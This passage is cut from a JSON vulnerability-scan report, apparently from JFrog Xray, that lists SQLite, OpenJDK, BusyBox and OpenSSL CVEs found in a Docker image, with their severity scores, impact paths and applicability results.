                    "summary": "SQLite before 3.32.0 allows a virtual table to be renamed to the name of one of its shadow tables, related to alter.c and build.c.",
                    "description": "SQLite before 3.32.0 allows a virtual table to be renamed to the name of one of its shadow tables, related to alter.c and build.c.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-13631",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.144Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-13631",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-196235",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21248",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2022-01-24T00:00:00.869Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21248",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187945",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Utility). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Utility). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35561",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.170Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35561",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195101",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21293",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.389Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21293",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-539896",
                    "summary": "A use-after-free vulnerability in BusyBox v.1.36.1 allows attackers to cause a denial of service via a crafted awk pattern in the awk.c evaluate function.",
                    "description": "A use-after-free vulnerability in BusyBox v.1.36.1 allows attackers to cause a denial of service via a crafted awk pattern in the awk.c evaluate function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-42364",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-11-28T00:00:00.277Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-42364",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-608052",
                    "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
                    "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-3446",
                            "cwe": [
                                "CWE-1333"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-3446",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-707554",
                    "summary": "Issue summary: Use of -addreject option with the openssl x509 application adds\na trusted use instead of a rejected use for a certificate.\n\nImpact summary: If a user intends to make a trusted certificate rejected for\na particular use it will be instead marked as trusted for that use.\n\nA copy & paste error during minor refactoring of the code introduced this\nissue in the OpenSSL 3.5 version. If, for example, a trusted CA certificate\nshould be trusted only for the purpose of authenticating TLS servers but not\nfor CMS signature verification and the CMS signature verification is intended\nto be marked as rejected with the -addreject option, the resulting CA\ncertificate will be trusted for CMS signature verification purpose instead.\n\nOnly users which use the trusted certificate format who use the openssl x509\ncommand line application to add rejected uses are affected by this issue.\nThe issues affecting only the command line application are considered to\nbe Low severity.\n\nThe FIPS modules in 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this\nissue.\n\nOpenSSL 3.4, 3.3, 3.2, 3.1, 3.0, 1.1.1 and 1.0.2 are also not affected by this\nissue.",
                    "description": "Issue summary: Use of -addreject option with the openssl x509 application adds\na trusted use instead of a rejected use for a certificate.\n\nImpact summary: If a user intends to make a trusted certificate rejected for\na particular use it will be instead marked as trusted for that use.\n\nA copy & paste error during minor refactoring of the code introduced this\nissue in the OpenSSL 3.5 version. If, for example, a trusted CA certificate\nshould be trusted only for the purpose of authenticating TLS servers but not\nfor CMS signature verification and the CMS signature verification is intended\nto be marked as rejected with the -addreject option, the resulting CA\ncertificate will be trusted for CMS signature verification purpose instead.\n\nOnly users which use the trusted certificate format who use the openssl x509\ncommand line application to add rejected uses are affected by this issue.\nThe issues affecting only the command line application are considered to\nbe Low severity.\n\nThe FIPS modules in 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this\nissue.\n\nOpenSSL 3.4, 3.3, 3.2, 3.1, 3.0, 1.1.1 and 1.0.2 are also not affected by this\nissue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-4575"
                        }
                    ],
                    "created": "2025-07-02T00:00:00.544Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2025-4575",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99980",
                    "summary": "In SQLite through 3.31.1, the ALTER TABLE implementation has a use-after-free, as demonstrated by an ORDER BY clause that belongs to a compound SELECT statement.",
                    "description": "In SQLite through 3.31.1, the ALTER TABLE implementation has a use-after-free, as demonstrated by an ORDER BY clause that belongs to a compound SELECT statement.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-11656",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.526Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in sqlite may lead to remote code execution when executing arbitrary SQL queries.",
                        "full_description": "The sqlite codebase contains a use-after-free issue that can be triggered via the `ALTER TABLE` SQL statement\n\nA PoC (crashing) exploit is available as a test case [in the commit](https://www.sqlite.org/src/info/d09f8c3621d5f7f8) that resolves this issue",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "is_positive": false
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "Attacker needs to perform arbitrary SQL queries",
                                "is_positive": true
                            },
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "description": "Use-after-free not proven to be exploitable for RCE",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "The vendor classified the issue as low severity",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:sqlite-libs:3.28.0-r3",
                            "cve_id": "CVE-2020-11656",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner searches for an <code>sqlite</code> binary that is compiled with the vulnerable <code>SQLITE_DEBUG</code> flag, by checking for the ELF symbol <code>sqlite3DebugPrintf</code> in the binary</p>",
                            "evidence": null,
                            "info": "The vulnerable symbol sqlite3DebugPrintf which indicates that SQLite is compiled with the DSQLITE_DEBUG flag is not found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:sqlite-libs:3.28.0-r3",
                            "vulnerability_id": "CVE-2020-11656",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99991",
                    "summary": "alter.c in SQLite through 3.30.1 allows attackers to trigger infinite recursion via certain types of self-referential views in conjunction with ALTER TABLE statements.",
                    "description": "alter.c in SQLite through 3.30.1 allows attackers to trigger infinite recursion via certain types of self-referential views in conjunction with ALTER TABLE statements.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-19645",
                            "cwe": [
                                "CWE-674"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.687Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2019-19645",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-208685",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21426",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-04-20T00:00:00.528Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21426",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607950",
                    "summary": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
